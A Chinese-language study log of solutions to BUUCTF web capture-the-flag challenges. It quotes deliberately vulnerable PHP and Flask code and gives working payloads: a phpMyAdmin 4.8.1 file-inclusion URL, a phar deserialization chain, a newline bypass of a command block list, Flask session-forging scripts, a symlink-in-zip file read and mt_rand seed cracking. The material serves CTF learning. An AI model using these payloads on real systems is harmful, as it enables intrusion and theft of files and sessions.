# BUUCTF做题总结
### 1.[RoarCTF 2019]Easy Calc
```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>
```
### 2.[极客大挑战 2019]BuyFlag
```php
<?php
if (isset($_POST['password'])) {
	$password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";
	}
}
```
    wp：使用password=404%20可以绕过is_numeric的检测，并且404%20在和404比较时候，由于使用了弱类型，所以404%20会被转成404。
    而如果money不够就返回you have not enough money,loser~
    money够就返回Nember lenth is too long
    所以这个地方也需要进行绕过，估计采用的是strcmp函数所以传入数组直接绕过。
    
### 3.[极客大挑战 2019]Secret File
    wp：找秘密web页面，一个跳转，抓一下就有了
    include使用php://filter协议直接读取flag.php就行了。
### 4.[De1CTF 2019]ShellShellShell
    留坑，知识点巨多
### 5.[安洵杯 2019]easy_web
    通过img包含文件得到源码。不过这个base64decode2次就太坑了- -还要转一次16进制。
    得到源码后发现是md5碰撞，进而得到flag
    知识点：sort可以读取，还有ca\t 也可以读取!
### 6.[RCTF 2019]Nextphp
    php7.4新型序列号漏洞
### 7.[GWCTF 2019]我有一个数据库
    phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613）
    漏洞payload：http://yourip:port/phpmyadmin/index.php?target=db_sql.php%253f<你的文件路径>
### 8.[RoarCTF 2019]Simple Upload
    条件竞争漏洞，有待分析
### 9.[GWCTF 2019]枯燥的抽奖
    php的伪随机数漏洞
网页源代码：
```php
header("Content-Type: text/html;charset=utf-8");
session_start();
if(!isset($_SESSION['seed'])){
$_SESSION['seed']=rand(0,999999999);
}

mt_srand($_SESSION['seed']);
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
$str_show = substr($str, 0, 10);
echo "<p id='p1'>".$str_show."</p>";
```
得到Gn0qGVf5hw为随机生成的前10位，后10位不可知道
可以使用php_mt_seed爆破，但是前提得让php_mt_seed识别这种类型的随机数，格式为数 + 数 + 最小值 + 最大值
```python
str1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
choose = "Gn0qGVf5hw"
flag = ""
for i in range(10):
    for j in range(len(str1)):
        if choose[i] == str1[j]:
            flag += str(j) + ' ' + str(j) + ' ' + '0' + ' ' + str(len(str1) - 1) + ' '
            break
print flag //42 42 0 61 13 13 0 61 26 26 0 61 16 16 0 61 42 42 0 61 57 57 0 61 5 5 0 61 31 31 0 61 7 7 0 61 22 22 0 61
```
    运行./php_mt_seed 42 42 0 61 13 13 0 61 26 26 0 61 16 16 0 61 42 42 0 61 57 57 0 61 5 5 0 61 31 31 0 61 7 7 0 61 22 22 0 61
    得到338669776
    还原20位的随机数得到flag
    
### 10.[SWPUCTF 2018]SimplePHP
考察的是关于php伪协议和反系列化
```php
<?php
class C1e4r
{
    public $test;
    public $str;
    public function __construct($name)
    {
        $this->str = $name;
    }
    public function __destruct()
    {
        $this->test = $this->str;
        echo $this->test;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file)
    {
        $this->source = $file;   //$this->source = phar://phar.jpg
        echo $this->source;
    }
    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }
    public function __set($key,$value)
    {
        $this->$key = $value;
    }
    public function _show()
    {
        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }
        
    }
    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}
class Test
{
    public $file;
    public $params;
    public function __construct()
    {
        $this->params = array();
    }
    public function __get($key)
    {
        return $this->get($key);
    }
    public function get($key)
    {
        if(isset($this->params[$key])) {
            $value = $this->params[$key];
        } else {
            $value = "index.php";
        }
        return $this->file_get($value);
    }
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}
?>
```
构造链：`__get()`调用了`file_get()`方法，而这个`file_get()`方法就为我们需要用到的读取flag文件的方法，而触发`__get`就需要调用这个类中不存在的函数，我们看到Show类中的`__toString()`中调用了`$this->str['str']->source;`而这个`str['str']`是我们可以控制的，所以可以使这个`str['str']`储存`Test`类，而`__toString`需要一个类作为字符串输出用，这时`C1e4r`类中存在一个`__destruct()`方法，里面有一个`echo $this->test;`这样构造链接就形成了
payload:
```php
<?php
class C1e4r{
    public $test;
    public $str;
}

class Show
{
    public $source;
    public $str;
}

class Test
{
    public $file;
    public $params;

}

$a = new Test();
$a->params = [
    'source' => '/var/www/html/f1ag.php'
];

$b = new Show();
$b->str['str'] = $a;

$c = new C1e4r();
$c->str = $b;

$phar = new Phar("test123.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($c); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
$phar->stopBuffering();//签名自动计算
copy('test123.phar','exp.gif');
$name = 'exp.gif'.'174.0.10.213';
echo md5($name);//37897b4e2daea073c403f3985955cd0f
?>
```
最终payload:file=phar://upload/37897b4e2daea073c403f3985955cd0f.jpg
`phar会自动反系列化Metadata中的数据,不管后缀如何`

### 11.[FBCTF2019]RCEService
这是一个执行json的命令行如：{"cmd":"ls"}
    
    使用的是preg_match绕过:通过fuzz，过滤了这些字符串
```php
if (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
    echo 'Hacking attempt detected<br/><br/>';
}
```
由于没有循环过滤，所以preg_match只会过滤第一行，使用`url`编码的`\n`即可绕过，如`%0a`
 `payload:{ %0a "cmd":"/bin/cat ../../../../../home/rceservice/flag" %0a }`
这个服务上的cat变量没有设置。需要自行指定
### 12.[SWPU2019]Web3
这个是一个flask的服务器
通过访问一个404的页面获得key=keyqqqwwweee!@#$%^&*
正常登陆，得到token=eyJpZCI6eyIgYiI6Ik1UQXcifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.XekLoQ.SbTTt8ISvhNT8GMDjRGK1F2sHF8
通过解密得到数据{u'username': u'admin', u'password': u'1', u'id': '100', u'is_login': True}
解密脚本
```python
import flask_session_cookie_manager2
s = "eyJpZCI6eyIgYiI6Ik1UQXcifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.XekLoQ.SbTTt8ISvhNT8GMDjRGK1F2sHF8"
key = "keyqqqwwweee!@#$%^&*"
res = flask_session_cookie_manager2.FSCM.decode(s, key)
print res
```
将100改为1，否则upload页面无法访问
加密脚本
```python
res = "{u'username': u'admin', u'password': u'1', u'id': '1', u'is_login': True}"
flag = flask_session_cookie_manager2.FSCM.encode(key, res)
```
访问upload页面后得到代码，这个是重点，存在漏洞
```python
cmd = "unzip -n -d "+path+" "+ pathname
```
构造一个软连接
```shell
ln -s /proc/self/cwd/flag/flag.jpg exp
zip -ry exp.zip exp
```
这里的`/proc/self/cwd`是会指向进程的当前目录
`这样服务解压完文件后将得到一个软连接，而这个软连接指向flag，读取这个exp就等于读取flag`
将exp.zip上传即可得到flag
### 13.[SWPU2019]Web4
时间盲注，留坑
### 14.[HarekazeCTF2019]Avatar Uploader 1
给了源码，留坑
### 15.[CISCN2019 华东南赛区]Web4
通过url=app.py读取到源码，其中
```python
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random()*233)
@app.route('/flag') 
def flag(): 
 	if session and session['username'] == 'fuck':
 	 	return open('/flag.txt').read() 
 	else: 
 		return 'Access denied'
```
`uuid.getnode()为mac地址去掉:的10进制数`可以通过`/sys/class/net/eth0/address`读取到mac地址
由于伪随机数到问题，可以直接爆破得到`key`,再通过修改`username='fuck'`得到访问/flag得到flag
脚本：
```python
import random
import flask_session_cookie_manager2

mac = "02:42:ae:00:3e:09"
random.seed(int(mac.replace(":", ""), 16))
for x in range(1000):
    SECRET_KEY = str(random.random() * 233)
    rs = flask_session_cookie_manager2.FSCM.decode('eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Xf9tCg.UY9vQq_TaU_r7ciAtdf1R3W2-k4', SECRET_KEY)
    if 'error' not in rs:
        print x
        print(SECRET_KEY)
        rs[u'username'] = 'fuck'
        print(str(rs))
        print(flask_session_cookie_manager2.FSCM.encode(SECRET_KEY, str(rs)))
        break
```
